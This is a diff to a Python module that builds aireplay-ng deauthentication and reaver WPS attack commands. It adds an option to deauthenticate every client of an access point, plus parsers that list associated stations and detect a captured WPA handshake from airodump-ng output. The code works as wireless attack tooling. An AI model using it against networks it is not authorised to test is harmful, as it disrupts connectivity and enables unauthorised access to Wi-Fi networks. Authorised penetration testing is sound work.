@@ -3,7 +3,7 @@ import csv
 import io
 import re
 
-VERSION = '0.3.2'
+VERSION = '0.4.0'
 ANSI = re.compile(r'\x1b\[[0-?]*[ -/]*[@-~]')
 
 def clean(text):
@@ -81,11 +81,13 @@ def test_command(action, interface, data, session):
     bssid = mac(data['bssid'])
     channel = str(number(data['channel'], 1, 233))
     if action == 'deauth':
-        station = mac(data['station'])
-        if station == bssid:
-            raise ValueError('Client MAC must differ from the access point.')
-        return ['aireplay-ng', '--deauth', str(number(data.get('count', 1), 1, 5)),
-                '-a', bssid, '-c', station, interface]
+        args = ['aireplay-ng', '--deauth', str(number(data.get('count', 1), 1, 5)), '-a', bssid]
+        if data.get('whole_network') is not True:
+            station = mac(data['station'])
+            if station == bssid:
+                raise ValueError('Client MAC must differ from the access point.')
+            args += ['-c', station]
+        return args + [interface]
     if action in ('wps', 'pixie'):
         attempts = 1 if action == 'pixie' else number(data.get('attempts', 10), 1, 100)
         args = ['reaver', '-i', interface, '-b', bssid, '-c', channel, '-vv',
@@ -223,3 +225,37 @@ class WpsObserver:
 def merge_wps(items, observations):
     return [{**item, **observations.get(item['bssid'],
              {'wps': 'Unknown', 'wps_detected': False, 'wps_locked': None})} for item in items]
+
+
+def clients(text, bssid):
+    """Read only stations associated with the selected AP from Airodump CSV."""
+    bssid = mac(bssid)
+    in_stations = False
+    result = []
+    for row in csv.reader(io.StringIO(text)):
+        if row and row[0].strip() == 'Station MAC':
+            in_stations = True
+            continue
+        if not in_stations or len(row) < 6:
+            continue
+        try:
+            station = mac(row[0])
+            ap = mac(row[5])
+        except ValueError:
+            continue
+        if ap == bssid and station != bssid:
+            result.append({'mac': station, 'signal': row[3].strip(), 'packets': row[4].strip()})
+    return result
+
+
+def handshake_announced(text, bssid):
+    """Trust only Airodump's explicit handshake announcement for this target."""
+    target = mac(bssid)
+    for line in clean(text).splitlines():
+        # Only the status header, never an AP row or an SSID that contains text.
+        if not re.match(r'^\s*CH\s+[-0-9, ]+', line) or '[ Elapsed:' not in line:
+            continue
+        matches = re.findall(r'\]\[ WPA handshake:\s*((?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})', line, re.I)
+        if target in (value.lower() for value in matches):
+            return True
+    return False
